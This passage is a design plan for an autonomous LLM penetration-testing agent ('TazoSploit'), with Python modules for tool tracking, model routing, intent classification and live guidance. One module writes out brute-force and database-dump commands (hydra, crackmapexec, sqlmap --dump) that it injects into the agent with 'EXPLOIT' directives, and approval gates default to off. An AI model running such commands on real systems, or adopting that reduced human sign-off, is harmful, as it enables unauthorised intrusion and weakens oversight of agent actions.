            output = ex.stdout[:get_setting('TOOL_OUTPUT_MAX_CHARS', 15000)]
            lines.append(f"Output: {output}")
        if ex.output_analysis:
            lines.append(f"Analysis: {ex.output_analysis[:500]}")
        if ex.error_message:
            lines.append(f"Error: {ex.error_message}")
        lines.append("")

    return "\n".join(lines)
```

### 3G. Todo List

#### What RedAmon Does

From `state.py`:

```python
class TodoItem(BaseModel):
    id: str
    description: str
    status: TodoStatus  # pending, in_progress, completed, blocked
    priority: Priority  # high, medium, low
    notes: Optional[str]
    created_at: datetime
    completed_at: Optional[datetime]
```

The LLM updates its own todo list each turn via `updated_todo_list` in `LLMDecision`. The formatted list is included in every prompt via `format_todo_list()`.

#### What to Implement

```python
# NEW: Add to DynamicAgent.__init__:
self.todo_list: List[Dict] = []  # [{description, status, priority, notes}]

# NEW METHOD:
def _format_todo_list(self) -> str:
    """Format todo list for LLM context."""
    if not self.todo_list:
        return "No tasks defined yet."
    lines = []
    for i, todo in enumerate(self.todo_list, 1):
        icon = {"pending": "[ ]", "in_progress": "[~]",
                "completed": "[x]", "blocked": "[!]"}.get(todo.get('status', 'pending'), '[ ]')
        pri = {"high": "!!!", "medium": "!!", "low": "!"}.get(todo.get('priority', 'medium'), '!!')
        lines.append(f"{i}. {icon} {pri} {todo['description']}")
    return "\n".join(lines)

# Update todo from structured output:
def _update_todo_from_decision(self, decision):
    """Update todo list from AgentDecision."""
    if hasattr(decision, 'updated_todo') and decision.updated_todo:
        self.todo_list = [t.dict() if hasattr(t, 'dict') else t
                         for t in decision.updated_todo]
```

### 3H. Multi-Objective Support

TazoSploit currently runs single-objective jobs. RedAmon supports multiple objectives in a continuous conversation session. This is relevant for multi-target jobs.

**Implementation:** Add to job state tracking:

```python
# In DynamicAgent.__init__:
self.objectives: List[Dict] = []  # [{content, completed, findings}]
self.current_objective_index: int = 0

def add_objective(self, content: str):
    """Add a new objective to the session."""
    self.objectives.append({
        'content': content,
        'completed': False,
        'started_at': datetime.utcnow().isoformat(),
        'findings': {},
    })

def complete_current_objective(self, reason: str):
    """Mark current objective as complete."""
    if self.current_objective_index < len(self.objectives):
        self.objectives[self.current_objective_index]['completed'] = True
        self.objectives[self.current_objective_index]['completed_reason'] = reason
        self.current_objective_index += 1
```

**Priority: Nice-to-have** (implement after core features)

### 3I. Exploit Node Writer

Covered in the knowledge_graph.py module above via `record_exploit_attempt()`. The deterministic ID (5-minute time bucket) pattern is adopted from RedAmon's `exploit_writer.py`.

Additionally, add auto-extraction of metasploit info from execution trace:

```python
# NEW METHOD in KnowledgeGraph:
def extract_metasploit_info(self, executions: list) -> Dict:
    """Extract metasploit module/payload from execution history."""
    info = {"module": None, "payload": None, "commands": []}
    for ex in executions:
        cmd = ex.content if hasattr(ex, 'content') else str(ex)
        if 'msfconsole' in cmd or 'metasploit' in cmd.lower():
            info["commands"].append(cmd)
            use_match = re.search(r'use\s+(exploit/\S+|auxiliary/\S+)', cmd)
            if use_match:
                info["module"] = use_match.group(1)
            payload_match = re.search(r'set\s+PAYLOAD\s+(\S+)', cmd, re.IGNORECASE)
            if payload_match:
                info["payload"] = payload_match.group(1)
    return info
```

---

## 4. Part 3: TazoSploit-Specific Upgrades

These are features that RedAmon does NOT have but that TazoSploit should implement.

### 4A. Tool Usage Tracker + Comfort Zone Breaker

**Problem:** The agent uses ~8 tools out of 125+. It gravitates to nmap, curl, and masscan.

**File: `kali-executor/open-interpreter/tool_usage_tracker.py` (NEW)**

```python
"""
Tool Usage Tracker + Comfort Zone Breaker

Tracks which tools the agent uses per job and forces diversity
when the agent gets stuck in a loop with the same few tools.
"""
import json
import logging
from typing import Dict, List, Optional, Set
from collections import Counter

logger = logging.getLogger(__name__)

# Maps findings to recommended exploitation tools
FINDING_TO_TOOLS = {
    "smb_open": ["crackmapexec", "smbclient", "enum4linux", "impacket-smbexec", "impacket-psexec"],
    "http_open": ["sqlmap", "nikto", "gobuster", "ffuf", "nuclei", "wfuzz"],
    "ssh_open": ["hydra", "ssh-audit", "medusa"],
    "rdp_open": ["hydra", "crowbar", "xfreerdp"],
    "mssql_open": ["crackmapexec", "impacket-mssqlclient", "sqsh"],
    "mysql_open": ["hydra", "mysql", "sqlmap"],
    "ftp_open": ["hydra", "ftp", "anonymous_ftp"],
    "winrm_open": ["evil-winrm", "crackmapexec"],
    "ldap_open": ["ldapsearch", "crackmapexec", "bloodhound"],
    "cve_found": ["metasploit", "searchsploit", "msfconsole"],
    "creds_found": ["crackmapexec", "evil-winrm", "impacket-psexec", "impacket-wmiexec"],
    "web_app": ["sqlmap", "commix", "burp", "zap", "wfuzz"],
    "wordpress": ["wpscan", "sqlmap"],
    "api_found": ["ffuf", "wfuzz", "curl", "sqlmap"],
}


class ToolUsageTracker:
    """Track tool usage and force diversity."""

    def __init__(self, redis_client=None, job_id: str = None):
        self.redis = redis_client
        self.job_id = job_id
        self.local_usage: Counter = Counter()
        self.redis_key = f"job:{job_id}:tool_usage" if job_id else None

    def record(self, tool_name: str):
        """Record that a tool was used."""
        tool = tool_name.lower().strip()
        self.local_usage[tool] += 1
        if self.redis and self.redis_key:
            self.redis.hincrby(self.redis_key, tool, 1)

    def get_usage(self) -> Dict[str, int]:
        """Get all tool usage counts."""
        if self.redis and self.redis_key:
            raw = self.redis.hgetall(self.redis_key)
            return {k: int(v) for k, v in raw.items()} if raw else dict(self.local_usage)
        return dict(self.local_usage)

    def get_unique_count(self) -> int:
        return len(self.get_usage())

    def should_force_diversity(self, iteration: int) -> bool:
        """Check if we should inject a diversity prompt."""
        usage = self.get_usage()
        unique = len(usage)
        # After 20 iterations with <4 unique tools
        if iteration > 20 and unique < 4:
            return True
        # Any single tool used >8 times
        for tool, count in usage.items():
            if count > 8:
                return True
        return False

    def get_overused_tools(self, threshold: int = 6) -> List[str]:
        """Get tools used more than threshold times."""
        return [t for t, c in self.get_usage().items() if c > threshold]

    def get_unused_relevant_tools(self, findings: List[str]) -> List[str]:
        """Get tools the agent SHOULD be using but isn't."""
        used = set(self.get_usage().keys())
        recommended = set()
        for finding in findings:
            for key, tools in FINDING_TO_TOOLS.items():
                if key in finding.lower():
                    recommended.update(tools)
        return list(recommended - used)

    def build_diversity_prompt(self, iteration: int, findings: List[str]) -> Optional[str]:
        """Build a diversity injection prompt if needed."""
        if not self.should_force_diversity(iteration):
            return None

        usage = self.get_usage()
        overused = self.get_overused_tools()
        unused = self.get_unused_relevant_tools(findings)

        parts = [
            f"⚠️ TOOL DIVERSITY ALERT (iteration {iteration}):",
            f"You've only used {len(usage)} unique tools: {', '.join(usage.keys())}",
        ]
        if overused:
            parts.append(f"OVERUSED (stop using): {', '.join(overused)}")
        if unused:
            parts.append(f"RECOMMENDED (try these): {', '.join(unused[:5])}")
            parts.append(f"Your NEXT command MUST use one of: {', '.join(unused[:3])}")
        if overused:
            parts.append(f"Do NOT run another {overused[0]} command.")

        return "\n".join(parts)
```

**Integration in `dynamic_agent.py`:**

```python
# In __init__:
from tool_usage_tracker import ToolUsageTracker
self.tool_tracker = ToolUsageTracker(redis_client=self.redis_client, job_id=self.session_id)

# After each execution:
tool = self._detect_tool(execution.content)
self.tool_tracker.record(tool)

# Before each LLM call:
diversity_prompt = self.tool_tracker.build_diversity_prompt(
    self.iteration,
    findings=[v.get('type', '') for v in self.vulns_found.values()]
)
if diversity_prompt:
    self.conversation.append({"role": "system", "content": diversity_prompt})
```

### 4B. Proactive Command Injection

**Problem:** The agent discovers vulnerabilities but doesn't know how to exploit them.

**File: `kali-executor/open-interpreter/exploitation_injector.py` (NEW)**

```python
"""
Proactive Exploitation Command Injector

Analyzes scan findings and generates specific exploitation commands
to inject as system messages, pushing the agent toward exploitation.
"""
import re
import logging
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)


class ExploitationInjector:
    """Generates exploitation commands from scan findings."""

    def generate_plan(self, findings: List[Dict], target: str) -> List[Dict]:
        """Generate exploitation plan from findings.

        Args:
            findings: List of {type, target, port, details, cve} dicts
            target: Primary target IP/hostname

        Returns:
            List of {tool, command, rationale, fallback} dicts
        """
        plan = []
        seen_ports = set()

        for f in findings:
            port = f.get('port', 0)
            vtype = (f.get('type') or '').lower()
            details = f.get('details', '')
            cve = f.get('cve', '')
            f_target = f.get('target', target)
            host = f_target.split(':')[0] if ':' in str(f_target) else str(f_target)

            # CVE-based exploitation
            if cve:
                plan.append({
                    'tool': 'metasploit',
                    'command': f"msfconsole -q -x 'search {cve}; exit'",
                    'rationale': f'CVE {cve} found — check for Metasploit module',
                    'fallback': f'searchsploit {cve}',
                    'priority': 'high',
                })

            # SMB (445)
            if port == 445 or 'smb' in vtype:
                if 445 not in seen_ports:
                    seen_ports.add(445)
                    plan.append({
                        'tool': 'crackmapexec',
                        'command': f'crackmapexec smb {host} -u Administrator -p /usr/share/wordlists/rockyou.txt --no-bruteforce',
                        'rationale': 'SMB open — try common credentials',
                        'fallback': f'nmap --script smb-vuln-* -p445 {host}',
                    })

            # HTTP (80, 443, 8080, 8443)
            if port in (80, 443, 8080, 8443) or 'http' in vtype or 'web' in vtype:
                if port not in seen_ports:
                    seen_ports.add(port)
                    scheme = 'https' if port in (443, 8443) else 'http'
                    url = f"{scheme}://{host}:{port}"
                    plan.append({
                        'tool': 'sqlmap',
                        'command': f"sqlmap -u '{url}/' --batch --forms --crawl=2 --level=3",
                        'rationale': 'Web app — test for SQL injection',
                        'fallback': f'nuclei -u {url} -severity critical,high',
                    })

            # SQL Injection specifically
            if 'sql' in vtype:
                plan.append({
                    'tool': 'sqlmap',
                    'command': f"sqlmap -u '{f_target}' --batch --dump --level=5 --risk=3",
                    'rationale': f'SQL injection at {f_target} — dump data',
                    'fallback': None,
                    'priority': 'critical',
                })

            # SSH (22)
            if port == 22 or 'ssh' in vtype:
                if 22 not in seen_ports:
                    seen_ports.add(22)
                    plan.append({
                        'tool': 'hydra',
                        'command': f'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt {host} ssh -t 4 -f',
                        'rationale': 'SSH open — brute force credentials',
                        'fallback': f'ssh-audit {host}',
                    })

            # RDP (3389)
            if port == 3389 or 'rdp' in vtype:
                if 3389 not in seen_ports:
                    seen_ports.add(3389)
                    plan.append({
                        'tool': 'hydra',
                        'command': f'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt {host} rdp -t 4',
                        'rationale': 'RDP open — brute force',
                        'fallback': None,
                    })

            # FTP (21)
            if port == 21 or 'ftp' in vtype:
                if 21 not in seen_ports:
                    seen_ports.add(21)
                    plan.append({
                        'tool': 'ftp',
                        'command': f'echo -e "anonymous\\nanonymous@" | ftp -n {host} 21',
                        'rationale': 'FTP open — check anonymous access',
                        'fallback': f'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt {host} ftp',
                    })

        # Sort by priority
        priority_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        plan.sort(key=lambda x: priority_order.get(x.get('priority', 'medium'), 2))

        return plan

    def format_injection_prompt(self, plan: List[Dict]) -> str:
        """Format exploitation plan as system message."""
        if not plan:
            return ""

        lines = [
            "🎯 EXPLOITATION PLAN (based on your reconnaissance):",
            ""
        ]
        for i, p in enumerate(plan, 1):
            lines.append(f"{i}. {p['tool'].upper()} → Run: {p['command']}")
            lines.append(f"   Reason: {p['rationale']}")
            if p.get('fallback'):
                lines.append(f"   Fallback: {p['fallback']}")
            lines.append("")

        lines.append("Execute these IN ORDER. Do not scan again. EXPLOIT.")
        return "\n".join(lines)
```

### 4C. Smart Model Routing

**File: `kali-executor/open-interpreter/model_router.py` (NEW)**

```python
"""
Smart Model Router — Use different LLM models for different phases/tasks.

Phase-based routing:
- RECON: Cheap model (Haiku/Flash) — simple output parsing
- EXPLOITATION planning: Expensive model (Opus/GPT-4) — complex reasoning
- Command generation: Mid-tier model (Sonnet) — good enough
- Evidence verification: Expensive model — critical accuracy
"""
import os
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# Phase → model mapping (configurable via settings)
DEFAULT_MODEL_ROUTING = {
    'RECON': os.getenv('MODEL_RECON', 'auto'),
    'VULN_DISCOVERY': os.getenv('MODEL_VULN', 'auto'),
    'EXPLOITATION': os.getenv('MODEL_EXPLOIT', 'auto'),
    'POST_EXPLOIT': os.getenv('MODEL_POST_EXPLOIT', 'auto'),
    'REPORT': os.getenv('MODEL_REPORT', 'auto'),
}

# Task-specific overrides (higher priority than phase)
TASK_MODEL_OVERRIDES = {
    'exploitation_planning': os.getenv('MODEL_EXPLOIT_PLAN', ''),
    'evidence_verification': os.getenv('MODEL_EVIDENCE', ''),
    'output_parsing': os.getenv('MODEL_PARSE', ''),
    'report_generation': os.getenv('MODEL_REPORT_GEN', ''),
}


class ModelRouter:
    """Route LLM calls to appropriate models based on context."""

    def __init__(self, routing: dict = None):
        self.routing = routing or DEFAULT_MODEL_ROUTING
        self.task_overrides = TASK_MODEL_OVERRIDES

    def get_model_for_phase(self, phase: str) -> Optional[str]:
        """Get the model name for a given phase.

        Returns None if 'auto' (use default model).
        """
        model = self.routing.get(phase, 'auto')
        if model == 'auto' or not model:
            return None  # Use default
        return model

    def get_model_for_task(self, task: str) -> Optional[str]:
        """Get model for a specific task type."""
        model = self.task_overrides.get(task, '')
        if not model:
            return None
        return model
```

**Integration with LLM client:**

```python
# In DynamicAgent, before each LLM call:
from model_router import ModelRouter
self.model_router = ModelRouter()

# In the LLM call section:
phase_model = self.model_router.get_model_for_phase(self.phase.current.value)
if phase_model and self.llm_is_provider:
    # Temporarily switch model
    original_model = self.llm.model
    self.llm.model = phase_model
    response = self.llm.chat(messages)
    self.llm.model = original_model
else:
    response = self.llm.chat(messages)
```

---

## 5. Part 4: Settings Comparison Table

### Complete Settings Comparison

| # | Setting | RedAmon Value | TazoSploit Current | TazoSploit Target | Priority |
|---|---------|--------------|--------------------|--------------------|----------|
| **LLM Configuration** |
| 1 | Model per-job | `gpt-5.2` (configurable via UI) | `LLM_MODEL` env var, profile system | Per-job via Redis settings | **Must-have** |
| 2 | Informational system prompt | Custom per-project | Single SYSTEM_PROMPT_BASE for all | Per-phase custom prompts | **Must-have** |
| 3 | Exploitation system prompt | Custom per-project | Same as above | Per-phase custom prompts | **Must-have** |
| 4 | Post-exploit system prompt | Custom per-project | Same as above | Per-phase custom prompts | **Must-have** |
| **Phase Configuration** |
| 5 | Phase model | 3 phases (informational/exploitation/post_exploitation) | 4+ phases (RECON/VULN/EXPLOIT/POST) but soft gates | Hard phase gates via PhaseState | **Must-have** |
| 6 | Activate post-exploit | Toggle (default True) | Always exists but optional | Add toggle to settings | **Nice-to-have** |
| 7 | Phase mode (stateful/stateless) | Configurable per-project | Always stateful | Add when multi-objective implemented | **Nice-to-have** |
| **Payload Direction** |
| 8 | LHOST | Per-project, empty=ask user | No centralized config | Per-job setting, auto-inject | **Must-have** |
| 9 | LPORT | Per-project, None=not set | No centralized config | Per-job setting, auto-inject | **Must-have** |
| 10 | Bind port on target | Per-project | Not implemented | Add as alternative to reverse | **Nice-to-have** |
| 11 | HTTPS payload toggle | Per-project | Not implemented | Add toggle | **Nice-to-have** |
| **Agent Limits** |
| 12 | Max iterations | 100 | 50 (configurable via env) | 100, per-job configurable | **Must-have** |
| 13 | Execution trace memory steps | 100 | All messages kept, digest at 150 | Configurable rolling window | **Must-have** |
| 14 | Tool output max chars | 20000 | ~15000 via _truncate_text | Centralize in settings | **Nice-to-have** |
| **Approval Gates** |
| 15 | Approval for exploitation | True | Not implemented | Optional gate (default OFF) | **Must-have** |
| 16 | Approval for post-exploit | True | Not implemented | Optional gate (default OFF) | **Must-have** |
| **Tool Restrictions** |
| 17 | Tool phase map | 6 tools mapped | Category-based in skill_router + hard_block_scan | Per-tool map for 125+ tools | **Must-have** |
| **Brute Force** |
| 18 | Max wordlist attempts | 3 | No limit | Add configurable limit | **Nice-to-have** |
| 19 | Brute force speed | 5 | Tool defaults | Central speed config | **Nice-to-have** |
| **Neo4j** |
| 20 | Knowledge graph | Full Neo4j integration | Not implemented | New Neo4j container + module | **Must-have** |
| 21 | Text-to-Cypher | LLM generates queries | Not implemented | Add query_graph tool | **Must-have** |
| 22 | Cypher max retries | 3 | N/A | Add to settings | **Must-have** |
| **Structured Output** |
| 23 | Agent output format | Pydantic LLMDecision model | Free-form text + regex parsing | Optional structured JSON | **Must-have** |
| 24 | LLM parse retries | 3 | N/A | Add retry with error feedback | **Must-have** |
| **Todo List** |
| 25 | LLM-managed todo | TodoItem with status/priority | Not implemented | Add to agent state | **Nice-to-have** |
| **Multi-Objective** |
| 26 | Multiple objectives per session | ConversationObjective model | Single objective per job | Add objective tracking | **Nice-to-have** |
| **Logging** |
| 27 | Log rotation | RotatingFileHandler (10MB, 5 backups) | No rotation | Add rotation | **Nice-to-have** |
| **TazoSploit Exclusive** |
| 28 | Tool usage tracker | ❌ Not in RedAmon | Not implemented | New module | **Must-have** |
| 29 | Comfort zone breaker | ❌ Not in RedAmon | Not implemented | Part of tracker | **Must-have** |
| 30 | Exploitation injector | ❌ Not in RedAmon | Partial (supervisor hints) | Proactive injection | **Must-have** |
| 31 | Smart model routing | ❌ Not in RedAmon | Profile system exists | Phase-based routing | **Nice-to-have** |
| 32 | 125+ skill arsenal | ❌ Not in RedAmon (only 6 tools via MCP) | Exists but underused | Force usage via tracker | **Already exists** |
| 33 | Evidence detection (12+ patterns) | ❌ Not in RedAmon (LLM-only detection) | Exists (EXPLOITATION_EVIDENCE_PATTERNS) | Keep + enhance | **Already exists** |
| 34 | Exploit chain memory | ❌ Not in RedAmon | Exists (ARTIFACT_PATTERNS) | Keep + graph-store | **Already exists** |
| 35 | CVE lookup | ❌ Not in RedAmon | Exists (cve_lookup.py) | Keep + graph-store | **Already exists** |

---

## 6. Part 6: Interactive Chat System (CRITICAL — Biggest UX Gap)

This is the single most important architectural difference between TazoSploit and RedAmon. RedAmon has a full bidirectional conversational WebSocket system. TazoSploit has a form that takes an IP address and streams raw logs. This section defines the complete chat system upgrade.

### 6.1 Current State vs Target

**TazoSploit currently has:**
- `POST /api/jobs` — creates a job with structured fields: `name`, `scope_id`, `phase`, `targets[]`, `intensity`, `exploit_mode`, `max_iterations`, `llm_provider`, `llm_profile` (from `control-plane/api/routers/jobs.py` `JobCreate` model)
- WebSocket `ws://…/job/{job_id}` — **one-directional**: subscribes to Redis pubsub `job:{id}:output`, streams raw log lines to frontend. No messages from client to agent. (from `control-plane/api/routers/websocket.py` `job_output_websocket`)
- WebSocket `ws://…/jobs/{job_id}/graph` and `ws://…/jobs/{job_id}/findings` — one-directional event streams for attack graph and finding notifications
- Supervisor hint system — file-based (`supervisor_hints.jsonl`), polled by agent via `_read_supervisor_hints()` (dynamic_agent.py line ~878). Reactive only: must write JSON lines to a file, agent reads on next iteration.
- `_send_websocket_update()` (dynamic_agent.py line ~783) — sends `event_type` + `data` JSON, but only status updates, never approval requests or questions

**RedAmon has (from `/tmp/redamon/agentic/websocket_api.py`):**
- Single WebSocket endpoint for FULL bidirectional communication
- 8 client→server message types: `init`, `query`, `approval`, `answer`, `ping`, `guidance`, `stop`, `resume`
- 13 server→client message types: `connected`, `thinking`, `thinking_chunk`, `tool_start`, `tool_output_chunk`, `tool_complete`, `phase_update`, `todo_update`, `approval_request`, `question_request`, `response`, `execution_step`, `task_complete`, `error`, `pong`, `stopped`, `guidance_ack`
- Guidance queue: user sends messages mid-execution, agent reads them at top of each iteration
- Stop/resume with LangGraph MemorySaver checkpointing
- Approval gates: agent pauses, asks permission, user responds, agent continues

**TazoSploit target:** Full conversational interface where the user describes what they want, interacts during execution, and guides the agent — while KEEPING our advantages (125+ skills, evidence detection, full Kali CLI).

### 6.2 Component A: Natural Language Job Creation

Instead of filling out a form with IP, phase, exploit mode, etc., the user types natural language in a chat interface. The system classifies intent and auto-configures everything.

**How RedAmon does it:**
- User sends `QUERY` message with `question` field: `"Exploit CVE-2021-41773 on 10.0.0.5"`
- `classify_attack_path()` in `orchestrator_helpers/phase.py` calls the LLM with `ATTACK_PATH_CLASSIFICATION_PROMPT` (from `/tmp/redamon/agentic/prompts/classification.py`)
- LLM returns structured JSON: `required_phase` (informational/exploitation), `attack_path_type` (cve_exploit/brute_force_credential_guess), `confidence`, `detected_service`
- Orchestrator uses this to set initial phase and select attack-path-specific prompts

**TazoSploit implementation:**

**File: `kali-executor/open-interpreter/intent_classifier.py` (NEW)**

```python
"""
Natural Language Intent Classifier for TazoSploit.

Classifies user requests into:
- target: IP/hostname/URL to attack
- phase: RECON, VULN_DISCOVERY, EXPLOITATION, POST_EXPLOIT, FULL
- attack_type: cve_exploit, brute_force, web_app, general
- objective: What the user wants to achieve
- detected_service: Specific service mentioned (ssh, http, smb, etc.)
"""
import json
import re
import logging
from typing import Dict, Optional, Tuple
from pydantic import BaseModel, Field
from typing import Literal

logger = logging.getLogger(__name__)


class IntentClassification(BaseModel):
    """Structured classification of user intent."""
    target: Optional[str] = Field(None, description="IP, hostname, or URL to target")
    phase: str = Field("FULL", description="Starting phase: RECON, EXPLOITATION, FULL")
    attack_type: str = Field("general", description="cve_exploit, brute_force, web_app, general")
    objective: str = Field("", description="User's objective in plain English")
    confidence: float = Field(0.5, ge=0.0, le=1.0)
    detected_service: Optional[str] = Field(None, description="ssh, http, smb, rdp, mysql, etc.")
    detected_cve: Optional[str] = Field(None, description="CVE ID if mentioned")
    reasoning: str = Field("", description="Why this classification")


# Regex-based fast classification (no LLM needed for obvious cases)
TARGET_PATTERNS = [
    re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'),  # IPv4
    re.compile(r'((?:https?://)?[\w.-]+\.\w{2,})'),          # Domain/URL
]

CVE_PATTERN = re.compile(r'(CVE-\d{4}-\d{4,})', re.IGNORECASE)

SERVICE_KEYWORDS = {
    'ssh': ['ssh', 'openssh', 'secure shell', 'port 22'],
    'http': ['http', 'web', 'apache', 'nginx', 'iis', 'port 80', 'port 443', 'port 8080', 'website'],
    'smb': ['smb', 'samba', 'windows share', 'port 445', 'cifs', 'netbios'],
    'rdp': ['rdp', 'remote desktop', 'port 3389'],
    'ftp': ['ftp', 'file transfer', 'port 21'],
    'mysql': ['mysql', 'mariadb', 'port 3306'],
    'mssql': ['mssql', 'sql server', 'port 1433'],
    'postgres': ['postgres', 'postgresql', 'port 5432'],
    'ldap': ['ldap', 'active directory', 'port 389', 'port 636'],
    'smtp': ['smtp', 'mail server', 'port 25'],
    'snmp': ['snmp', 'port 161'],
    'redis': ['redis', 'port 6379'],
    'vnc': ['vnc', 'port 5900'],
    'telnet': ['telnet', 'port 23'],
    'winrm': ['winrm', 'port 5985', 'port 5986'],
}

EXPLOIT_KEYWORDS = ['exploit', 'attack', 'pwn', 'hack', 'compromise', 'break into',
                    'gain access', 'shell', 'rce', 'remote code execution']
BRUTE_KEYWORDS = ['brute', 'crack', 'password', 'credential', 'dictionary', 'wordlist',
                  'spray', 'guess', 'default creds', 'hydra']
RECON_KEYWORDS = ['scan', 'enumerate', 'discover', 'find', 'what services', 'what ports',
                  'reconnaissance', 'recon', 'footprint', 'information gathering']


def classify_fast(text: str) -> IntentClassification:
    """Fast regex-based classification (no LLM call). Handles obvious cases."""
    text_lower = text.lower().strip()
    result = IntentClassification(objective=text)

    # Extract target
    for pattern in TARGET_PATTERNS:
        match = pattern.search(text)
        if match:
            result.target = match.group(1)
            break

    # Extract CVE
    cve_match = CVE_PATTERN.search(text)
    if cve_match:
        result.detected_cve = cve_match.group(1).upper()
        result.attack_type = "cve_exploit"
        result.phase = "EXPLOITATION"
        result.confidence = 0.95

    # Detect service
    for service, keywords in SERVICE_KEYWORDS.items():
        if any(kw in text_lower for kw in keywords):
            result.detected_service = service
            break

    # Classify intent
    if any(kw in text_lower for kw in BRUTE_KEYWORDS):
        result.attack_type = "brute_force"
        result.phase = "EXPLOITATION"
        result.confidence = max(result.confidence, 0.85)
    elif any(kw in text_lower for kw in EXPLOIT_KEYWORDS):
        result.attack_type = "cve_exploit" if result.detected_cve else "general"
        result.phase = "EXPLOITATION"
        result.confidence = max(result.confidence, 0.80)
    elif any(kw in text_lower for kw in RECON_KEYWORDS):
        result.attack_type = "general"
        result.phase = "RECON"
        result.confidence = max(result.confidence, 0.80)

    # If no strong signal, default to FULL
    if result.confidence < 0.6:
        result.phase = "FULL"
        result.attack_type = "general"
        result.confidence = 0.5
        result.reasoning = "No strong intent signal; defaulting to full pentest"

    return result


INTENT_CLASSIFICATION_PROMPT = """You are classifying a penetration testing request.

Determine:
1. TARGET: IP address, hostname, or URL to attack (null if not specified)
2. PHASE: "RECON" (just scan/enumerate), "EXPLOITATION" (attack/exploit), "FULL" (do everything)
3. ATTACK_TYPE: "cve_exploit" (known CVE), "brute_force" (credential attack), "web_app" (web vuln), "general" (full pentest)
4. DETECTED_SERVICE: Specific service mentioned (ssh, http, smb, rdp, mysql, ftp, etc.) or null
5. DETECTED_CVE: CVE ID if mentioned, or null

User request: {objective}

Output valid JSON:
```json
{{
    "target": "10.0.0.5" or null,
    "phase": "RECON" | "EXPLOITATION" | "FULL",
    "attack_type": "cve_exploit" | "brute_force" | "web_app" | "general",
    "objective": "Human-readable objective summary",
    "confidence": 0.0-1.0,
    "detected_service": "ssh" | "http" | ... | null,
    "detected_cve": "CVE-XXXX-XXXXX" | null,
    "reasoning": "Brief classification reasoning"
}}
```
"""


async def classify_with_llm(text: str, llm_client) -> IntentClassification:
    """LLM-based classification for ambiguous cases."""
    # First try fast classification
    fast = classify_fast(text)
    if fast.confidence >= 0.8:
        return fast

    # Fall back to LLM
    try:
        prompt = INTENT_CLASSIFICATION_PROMPT.format(objective=text)
        response = await llm_client.achat([
            {"role": "system", "content": "Output only valid JSON. No explanation."},
            {"role": "user", "content": prompt},
        ])
        # Parse JSON from response
        json_match = re.search(r'\{.*\}', response, re.DOTALL)
        if json_match:
            data = json.loads(json_match.group(0))
            return IntentClassification.model_validate(data)
    except Exception as e:
        logger.warning(f"LLM classification failed: {e}")

    return fast  # Return regex result as fallback


def build_job_config_from_intent(classification: IntentClassification) -> Dict:
    """Convert intent classification into TazoSploit job configuration.

    Returns a dict compatible with the existing job creation flow,
    mapping natural language intent to the structured fields
    expected by DynamicAgent.__init__().
    """
    config = {
        'targets': [classification.target] if classification.target else [],
        'phase': classification.phase,
        'objective': classification.objective,
        'exploit_mode': 'autonomous' if classification.phase == 'EXPLOITATION' else 'explicit_only',
        'attack_type': classification.attack_type,
        'detected_service': classification.detected_service,
        'detected_cve': classification.detected_cve,
    }

    # Auto-configure settings based on attack type
    settings = {}
    if classification.attack_type == 'brute_force' and classification.detected_service:
        settings['BRUTE_FORCE_MAX_WORDLIST_ATTEMPTS'] = 3
        settings['BRUTEFORCE_SPEED'] = 5
    if classification.detected_cve:
        settings['EXPLOITATION_SYSTEM_PROMPT'] = (
            f"Your primary objective is to exploit {classification.detected_cve}. "
            f"Search for exploit modules, configure appropriately, and achieve code execution."
        )

    config['settings_overrides'] = settings
    return config
```

**Integration into the API layer:**

```python
# MODIFY: control-plane/api/routers/jobs.py
# ADD new endpoint alongside existing POST /jobs:

class ChatJobCreate(BaseModel):
    """Natural language job creation request."""
    message: str = Field(..., min_length=1, max_length=2000,
                         description="Natural language pentest request")
    scope_id: str
    # Optional overrides (user can still specify explicitly)
    targets: Optional[List[str]] = None
    phase: Optional[str] = None

@router.post("/jobs/chat", response_model=JobResponse)
async def create_job_from_chat(
    request: ChatJobCreate,
    user: CurrentUser = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """Create a job from natural language description.

    Classifies intent, extracts target/phase/attack_type, and creates job.
    Falls back to FULL phase if classification is ambiguous.
    """
    from intent_classifier import classify_fast, build_job_config_from_intent

    classification = classify_fast(request.message)
    config = build_job_config_from_intent(classification)

    # Allow user overrides
    if request.targets:
        config['targets'] = request.targets
    if request.phase:
        config['phase'] = request.phase

    # Create job using existing flow (reuse create_job logic)
    # ... map config to JobCreate fields and call existing job creation ...
```

### 6.3 Component B: Live Guidance System (Chat During Execution)

This is the **killer feature**. Users can send messages to the agent while it's running, steering it in real-time without stopping/restarting.

**How RedAmon does it (from `websocket_api.py`):**

1. `WebSocketConnection` has an `asyncio.Queue` called `guidance_queue`
2. User sends `GUIDANCE` message → handler calls `await connection.guidance_queue.put(message)` → sends `GUIDANCE_ACK` back
3. Orchestrator calls `connection.drain_guidance()` at the start of each iteration (non-blocking, gets all queued messages)
4. Guidance messages are injected into the LLM context as additional instructions

```python
# RedAmon's drain pattern (from WebSocketConnection):
def drain_guidance(self) -> list:
    """Drain all pending guidance messages from the queue (non-blocking)."""
    messages = []
    while not self.guidance_queue.empty():
        try:
            messages.append(self.guidance_queue.get_nowait())
        except asyncio.QueueEmpty:
            break
    return messages
```

**TazoSploit implementation:**

We need to bridge the existing file-based supervisor hint system to a real-time WebSocket guidance queue. The agent already has `_read_supervisor_hints()` which polls a JSONL file — we replace/augment this with a Redis-backed queue that the WebSocket handler writes to.

**File: `kali-executor/open-interpreter/guidance_queue.py` (NEW)**

```python
"""
Real-time guidance queue for TazoSploit.

Replaces the file-based supervisor_hints.jsonl with a Redis-backed queue.
The WebSocket handler pushes messages, the agent drains them each iteration.
"""
import json
import time
import logging
from typing import List, Optional, Dict
from datetime import datetime

logger = logging.getLogger(__name__)


class GuidanceQueue:
    """Redis-backed guidance queue for real-time agent steering."""

    def __init__(self, redis_client=None, job_id: str = None):
        self.redis = redis_client
        self.job_id = job_id
        self.queue_key = f"job:{job_id}:guidance" if job_id else None
        self.history_key = f"job:{job_id}:guidance_history" if job_id else None
        # In-memory fallback when Redis is unavailable
